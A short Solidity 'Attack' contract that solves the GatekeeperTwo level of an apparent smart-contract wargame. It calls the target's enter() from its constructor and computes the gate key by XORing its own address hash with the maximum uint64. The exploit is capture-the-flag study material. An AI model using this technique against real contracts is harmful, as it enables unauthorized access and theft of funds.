pragma solidity ^0.8.0;

import "./GatekeeperTwo.sol";

contract Attack {
  constructor(address _gatekeeperTwo) {
    bytes8 gateKey= bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max);

    GatekeeperTwo instance = GatekeeperTwo(_gatekeeperTwo);
    instance.enter(gateKey);
  }
}